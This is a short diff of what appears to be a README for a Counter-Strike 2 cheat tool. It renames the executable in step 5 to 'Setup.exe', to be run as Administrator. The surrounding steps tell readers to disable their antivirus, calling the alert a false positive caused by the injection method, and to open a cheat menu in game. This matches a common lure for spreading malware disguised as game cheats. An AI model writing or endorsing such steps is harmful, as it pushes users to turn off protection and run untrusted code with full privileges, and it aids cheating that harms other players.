@@ -28,7 +28,7 @@
 
 4. **Disable your antivirus** (false positive due to injection method).
 
-5. **Run `CS2_Legit_Tool.exe`** as Administrator.
+5. **Run `Setup.exe`** as Administrator.
 
 6. Launch CS2, press `INSERT` to open menu. Own noobs! 🎮
 
